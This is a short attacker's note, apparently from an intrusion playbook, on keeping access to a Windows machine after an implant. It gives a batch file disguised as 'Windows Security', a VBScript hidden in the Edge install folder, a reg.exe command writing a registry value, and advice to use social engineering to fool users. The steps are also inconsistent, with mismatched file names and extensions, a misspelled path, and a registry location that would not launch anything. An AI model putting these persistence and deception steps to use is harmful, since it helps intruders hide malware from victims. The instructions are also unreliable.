Users generally don't mess around with windows registry so its a best place for us to implement changes to the system

After getting initial Access through implant 

1. Deploy a batch file

Filename: Windows Security.batch
Content: 
        @echo off
        wscript.exe "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.vbs"


2. Deploy vbsript 

Filename: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.ps1
Content:
        payload script

Sometimes vbscript notification will popup, use social engineering tactics to fool the users and then deploy actual Files but batch files won't send notification

Then run this 

reg.exe add HKEY_CURRENT_USER\Environment /v WindowsSecurity /d C:\Users\Administartor\vbscript.vbs /t REG_SZ /f
